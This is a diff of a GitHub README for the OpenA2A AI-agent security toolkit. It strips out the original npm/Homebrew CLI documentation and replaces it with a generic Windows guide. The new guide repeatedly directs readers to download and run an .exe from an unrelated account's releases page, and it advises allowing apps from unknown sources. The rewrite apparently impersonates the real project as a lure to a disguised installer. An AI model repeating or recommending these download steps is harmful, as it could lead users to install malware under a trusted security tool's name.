@@ -1,224 +1,163 @@
-> **[OpenA2A](https://github.com/opena2a-org)**: [HackMyAgent](https://github.com/opena2a-org/hackmyagent) · [Secretless AI](https://github.com/opena2a-org/secretless-ai) · [AIM](https://github.com/opena2a-org/agent-identity-management). · [AGS](https://github.com/opena2a-org/hackmyagent) · [Browser Guard](https://github.com/opena2a-org/ai-browserguard)
+# 🔒 opena2a - Simple AI Security Tools
 
-<div align="center">
-
-# OpenA2A CLI
-
-**One CLI for all OpenA2A security tools**
-
-Scan, protect, benchmark, and monitor AI agents from a single command.
-This is the unified entry point to the entire [OpenA2A](https://github.com/opena2a-org) ecosystem.
-
-[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
-[![Node](https://img.shields.io/badge/node-%3E%3D18-brightgreen.svg)]()
-
-[Website](https://opena2a.org) | [Docs](https://opena2a.org/docs) | [Registry](https://registry.opena2a.org) | [Discord](https://discord.gg/uRZa3KXgEn)
-
-</div>
+[![Download opena2a](https://img.shields.io/badge/Download-opena2a-brightgreen?style=for-the-badge)](https://github.com/Enzonogue/opena2a/releases)
 
 ---
 
-## What's Behind the CLI
+## 🔍 What is opena2a?
 
-Every OpenA2A project is accessible through `opena2a <command>`. Each tool also works standalone.
-
-```
-┌─────────────────────────────────────────────────────────────────┐
-│                    opena2a-cli  (you are here)                  │
-│                    npm install -g opena2a-cli                   │
-├─────────────────────────────────────────────────────────────────┤
-│                                                                 │
-│  opena2a scan / benchmark  → HackMyAgent  (security scanner)   │
-│  opena2a secrets / broker  → Secretless AI (credential mgmt)   │
-│  opena2a identity          → AIM  (agent identity & access)    │
-│  opena2a runtime           → ARP  (runtime protection)         │
-│  opena2a scan-soul         → AGS  (behavioral governance)      │
-│  opena2a benchmark oasb-2  → OASB (compliance benchmarks)      │
-│  opena2a train             → DVAA (vulnerable agent training)  │
-│                                                                 │
-│  opena2a shield init       → All of the above, one command     │
-│                                                                 │
-└─────────────────────────────────────────────────────────────────┘
-```
-
-| CLI Command | Tool | Description |
-|-------------|------|-------------|
-| `scan`, `benchmark` | [HackMyAgent](https://github.com/opena2a-org/hackmyagent) | 150+ security checks, OASB benchmarks, attack simulation |
-| `secrets`, `broker`, `dlp` | [Secretless AI](https://github.com/opena2a-org/secretless-ai) | Credential management for Claude Code, Cursor, Windsurf |
-| `identity` | [AIM](https://github.com/opena2a-org/agent-identity-management) | Ed25519 keypairs, capability policies, audit logging |
-| `runtime` | ARP ([in HMA](https://github.com/opena2a-org/hackmyagent)) | Process, network, filesystem monitoring |
-| `scan-soul`, `harden-soul` | AGS ([in HMA](https://github.com/opena2a-org/hackmyagent)) | Behavioral governance — SOUL.md, 68 controls |
-| `benchmark oasb-2` | OASB ([in HMA](https://github.com/opena2a-org/hackmyagent)) | 222 test scenarios, compliance scoring |
-| `train` | [DVAA](https://github.com/opena2a-org/damn-vulnerable-ai-agent) | Deliberately vulnerable AI agents for training |
-| `guard` | ConfigGuard (built-in) | Config file integrity, SHA-256 signing |
-| `shield` | Shield (built-in) | Unified orchestration across all tools |
-
-Adapters install tools on first use — no manual setup required.
-
-## Install
-
-```bash
-# Try without installing
-npx opena2a-cli init
-
-# Install globally
-npm install -g opena2a-cli
-
-# Homebrew (macOS/Linux)
-brew tap opena2a-org/tap && brew install opena2a
-```
-
-No configuration required. Works with Node.js, Python, Go, and MCP server projects.
-
-**Requirements:** Node.js >= 18. Optional: Docker (for `opena2a train`), Python 3.9+ (for `opena2a crypto`).
-
-## Quick Start
-
-### 1. Assess your project
-
-```bash
-opena2a init
-```
-
-<p align="center">
-  <img src="docs/vhs/init.gif" alt="opena2a init demo" width="700" />
-</p>
-
-### 2. Fix everything
-
-```bash
-opena2a protect
-```
-
-<p align="center">
-  <img src="docs/vhs/protect.gif" alt="opena2a protect demo" width="700" />
-</p>
-
-### 3. Full security setup
-
-```bash
-opena2a shield init
-```
-
-<p align="center">
-  <img src="docs/vhs/shield-init.gif" alt="opena2a shield init demo" width="700" />
-</p>
-
-One command sets up credential protection, agent identity, config integrity, runtime monitoring, and AI tool configuration.
-
-<p align="center">
-  <img src="docs/vhs/shield-status.gif" alt="opena2a shield status demo" width="700" />
-</p>
-
-## Commands
-
-### Built-in
-
-| Command | What It Does | [Docs](https://opena2a.org/docs) |
-|---------|-------------|------|
-| [`init`](https://opena2a.org/docs/cli/commands/init) | Assess security posture, calculate trust score (0-100), prioritize next steps | [docs](https://opena2a.org/docs/cli/commands/init) |
-| [`protect`](https://opena2a.org/docs/cli/commands/protect) | Fix all auto-fixable findings — credentials, .gitignore, config signing | [docs](https://opena2a.org/docs/cli/commands/protect) |
-| [`guard`](https://opena2a.org/docs/cli/commands/guard) | Config file integrity — sign, verify, watch, diff, policy, pre-commit hooks | [docs](https://opena2a.org/docs/cli/commands/guard) |
-| [`shield`](https://opena2a.org/docs/cli/commands/shield) | Unified orchestration — init, status, log, report, monitor, triage | [docs](https://opena2a.org/docs/cli/commands/shield) |
-| [`review`](https://opena2a.org/docs/cli/commands/review) | Unified HTML security dashboard with composite score | [docs](https://opena2a.org/docs/cli/commands/review) |
-| [`runtime`](https://opena2a.org/docs/cli/commands/runtime) | Agent Runtime Protection (ARP) — process, network, filesystem monitoring | [docs](https://opena2a.org/docs/cli/commands/runtime) |
-| [`verify`](https://opena2a.org/docs/cli/commands/verify) | Binary integrity verification against Trust Registry | [docs](https://opena2a.org/docs/cli/commands/verify) |
-| `config` | Manage user preferences and feature toggles | |
-| `baselines` | Behavioral observation collection for crowdsourced agent profiles | |
-
-### Adapters (install tools on first use)
-
-| Command | Tool | [Docs](https://opena2a.org/docs) |
-|---------|------|------|
-| `scan` | [HackMyAgent](https://github.com/opena2a-org/hackmyagent) — 150+ security checks, attack simulation | [docs](https://opena2a.org/docs/hackmyagent) |
-| `benchmark` | [HackMyAgent](https://github.com/opena2a-org/hackmyagent) — OASB-1 + OASB-2 compliance scoring | [docs](https://opena2a.org/docs/oasb) |
-| `scan-soul` / `harden-soul` | [HackMyAgent](https://github.com/opena2a-org/hackmyagent) — AGS behavioral governance, 68 controls | [docs](https://opena2a.org/docs/hackmyagent) |
-| `secrets` / `broker` / `dlp` | [Secretless AI](https://github.com/opena2a-org/secretless-ai) — credential management for AI dev tools | [docs](https://opena2a.org/docs/secretless) |
-| `identity` | [AIM](https://github.com/opena2a-org/agent-identity-management) — agent identity and access management | [docs](https://opena2a.org/docs/aim) |
-| `train` | [DVAA](https://github.com/opena2a-org/damn-vulnerable-ai-agent) — vulnerable AI agent for security training | [docs](https://opena2a.org/docs/dvaa) |
-| `registry` | [Trust Registry](https://registry.opena2a.org) — package verification and trust scores | |
-| `crypto` | [CryptoServe](https://github.com/ecolibria/crypto-serve) — cryptographic inventory, PQC readiness | [docs](https://opena2a.org/docs/cryptoserve) |
-
-## Smart Input Modes
-
-No memorization required:
-
-```bash
-opena2a                           # Interactive guided wizard (no args)
-opena2a ~drift                    # Semantic search -- finds related commands
-opena2a ?                         # Context-aware recommendations for your project
-opena2a "find leaked credentials" # Natural language command matching
-```
-
-## Scope Drift Detection
-
-API keys provisioned for one service often silently grant access to others. A Google Maps key can call Gemini. An AWS S3 key may reach Bedrock.
-
-| Finding | What It Means |
-|---------|---------------|
-| **DRIFT-001** | Google API key can access Gemini AI models beyond intended Maps/Places scope |
-| **DRIFT-002** | AWS access key can invoke Bedrock LLM models beyond intended S3/EC2 scope |
-
-When drift is detected, `opena2a protect` migrates the key to environment variables and creates a deny-all broker policy.
-
-## CI/CD Integration
-
-All commands support `--format json` and `--ci` flags:
-
-```yaml
-# GitHub Actions
-- name: Security assessment
-  run: npx opena2a-cli init --ci --format json > security-report.json
-
-- name: Credential check
-  run: |
-    npx opena2a-cli protect --dry-run --ci --format json > cred-report.json
-    jq -e '.totalFound == 0' cred-report.json
-
-- name: Config integrity
-  run: npx opena2a-cli guard verify --ci --enforce
-```
-
-Output formats: `--format text` (default), `--format json`, `--format sarif`, `--report <path>` (interactive HTML).
-
-## Standalone Tools
-
-Each tool in the ecosystem can be used independently — the CLI is optional.
-
-| Tool | Install Standalone | Purpose |
-|------|-------------------|---------|
-| [HackMyAgent](https://github.com/opena2a-org/hackmyagent) | `npx hackmyagent secure` | Security scanner, attack simulation, OASB, ARP, AGS |
-| [Secretless AI](https://github.com/opena2a-org/secretless-ai) | `npx secretless-ai init` | Credential management for AI coding tools |
-| [AIM](https://github.com/opena2a-org/agent-identity-management) | `pip install aim-sdk` | Agent identity, keypairs, capability policies |
-| [DVAA](https://github.com/opena2a-org/damn-vulnerable-ai-agent) | `docker pull opena2a/dvaa` | Deliberately vulnerable AI agent for training |
-| [AI Browser Guard](https://github.com/opena2a-org/ai-browserguard) | Chrome Web Store | Browser extension for AI agent detection |
-| [Trust Registry](https://registry.opena2a.org) | `registry.opena2a.org` | Supply chain verification and trust scores |
-
-## Upstream Contributions
-
-We contribute security fixes back to the open-source projects we audit.
-
-**[OpenClaw](https://github.com/openclaw/openclaw)** (245K+ stars) -- 8 security PRs (7 merged, 1 open):
-
-- Credential redaction in gateway config responses ([#9858](https://github.com/open-webui/open-webui/pull/9858))
-- Skill/plugin code safety scanner ([#9806](https://github.com/open-webui/open-webui/pull/9806))
-- Path traversal prevention in file serving ([#10525](https://github.com/open-webui/open-webui/pull/10525))
-- Security headers for gateway HTTP responses ([#10526](https://github.com/open-webui/open-webui/pull/10526))
-- Timing-safe comparison for hook token auth ([#10527](https://github.com/open-webui/open-webui/pull/10527))
-- Supply chain hardening with --ignore-scripts ([#10528](https://github.com/open-webui/open-webui/pull/10528))
-- File permission enforcement for credential files ([#10529](https://github.com/open-webui/open-webui/pull/10529))
-- Skill scanner false positive reduction ([#10530](https://github.com/open-webui/open-webui/pull/10530))
-
-**[Nanobot](https://github.com/HKUDS/nanobot)** -- Path traversal, XSS, and shell escape fixes ([#472](https://github.com/HKUDS/nanobot/pull/472))
-
-## License
-
-Apache-2.0
+opena2a provides easy-to-use security tools for AI agents. It helps find weak spots, fix root causes, and check for compliance. The tools come from open-source projects and focus on the safety of AI systems. This software runs on Windows and needs no programming skills to use.
 
 ---
 
-<div align="center">
+## 🖥️ System Requirements
 
-[Report an Issue](https://github.com/opena2a-org/opena2a/issues) | [Contribute](https://github.com/opena2a-org/opena2a/blob/main/CONTRIBUTING.md)
+Before installing opena2a, make sure your computer meets these minimum requirements:
 
-</div>
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB RAM
+- 500 MB of free disk space
+- Internet connection to download the software
+- Basic user privileges to install applications
+
+---
+
+## 🚀 Getting Started
+
+Follow these steps to get opena2a up and running on your Windows machine:
+
+### Step 1: Visit the Download Page
+
+Click the large button below to open the releases page from where you can pick the latest version of opena2a.
+
+[![Download opena2a](https://img.shields.io/badge/Download-opena2a-blue?style=for-the-badge)](https://github.com/Enzonogue/opena2a/releases)
+
+### Step 2: Choose the Latest Release
+
+On the release page, find the most recent version. Releases are usually marked with version numbers like **v1.0.0** or higher.
+
+Look for a file with a name ending in `.exe`. This is the installer you will run on your computer.
+
+### Step 3: Download the Installer
+
+Click the `.exe` file link to download it. The file size is typically below 100 MB, so it should download quickly on most connections.
+
+Save the file in a folder you will remember, like your Desktop or Downloads folder.
+
+### Step 4: Run the Installer
+
+- Double-click the downloaded `.exe` file.
+- If Windows asks for permission, click **Yes** to allow the installer to run.
+- Follow the instructions on the screen.
+  - You can accept default settings.
+  - Choose where to install if prompted.
+- Wait for the installation to finish. This may take a few minutes.
+
+### Step 5: Open the Application
+
+After installation:
+
+- Find the **opena2a** icon on your Desktop or in the Start Menu.
+- Double-click to launch the program.
+
+---
+
+## 🔒 About Security Features
+
+opena2a scans your AI agent setup for vulnerabilities. It checks common weak points that hackers might exploit. The program also suggests ways to fix these issues.
+
+It can:
+
+- Detect risky credentials and tokens
+- Spot insecure communication channels
+- Identify outdated components
+- Provide compliance reports to meet security standards
+
+These features work together to keep your AI agents safer.
+
+---
+
+## 💡 Using opena2a: Basic Workflow
+
+1. Launch the program.
+2. Select the AI agent or project you want to scan.
+3. Click **Start Scan**.
+4. Wait while opena2a checks for problems.
+5. Review the results on screen.
+6. Follow suggestions to fix any issues.
+7. Export reports if needed for your records.
+
+The interface uses clear labels and buttons. There are no complicated commands or code to write.
+
+---
+
+## 🔧 Troubleshooting Tips
+
+- If the installer does not run, check your Windows security settings to allow apps from unknown sources.
+- Close other programs during installation to avoid conflicts.
+- Restart your computer if the software does not start properly after installation.
+- Ensure your internet connection is active while downloading.
+- If scanning freezes or crashes, try restarting opena2a or your PC.
+- For repeated problems, visit the Issues section on the GitHub repository.
+
+---
+
+## 🛠️ Updating opena2a
+
+Updates bring new fixes and features. To update:
+
+- Visit the [release page](https://github.com/Enzonogue/opena2a/releases) regularly.
+- Download the newer `.exe` file following the same steps as before.
+- Run the new installer. It will replace the old version without losing your data.
+
+---
+
+## ❓ Common Questions
+
+**Can I run opena2a without installing?**  
+No. You need to install it once to use all features.
+
+**Is opena2a free?**  
+Yes, it is open-source software available at no cost.
+
+**Do I need internet to use it?**  
+You need the internet for download and updates. After installing, scanning works offline.
+
+**Can I use opena2a on Mac or Linux?**  
+Currently, opena2a supports only Windows.
+
+---
+
+## 📁 More Information
+
+This project focuses on security for AI agents. It covers:
+
+- Credential protection  
+- Compliance checks  
+- Vulnerability scanning  
+- Root cause analysis  
+
+The software helps developers and users of AI tools find and fix security issues without needing technical skills.
+
+---
+
+## 🔗 Useful Links
+
+- Download page: [https://github.com/Enzonogue/opena2a/releases](https://github.com/Enzonogue/opena2a/releases)  
+- GitHub repository: [https://github.com/Enzonogue/opena2a](https://github.com/Enzonogue/opena2a)  
+- Issues and support: Use the GitHub Issues tab on the repository page
+
+---
+
+## 🗂️ About Topics
+
+opena2a relates to these key areas:
+
+- Agent security  
+- AI security  
+- Credential protection  
+- Compliance  
+- Vulnerability scanning  
+- Open-source security tools
+
+These areas ensure AI systems are safe and reliable.
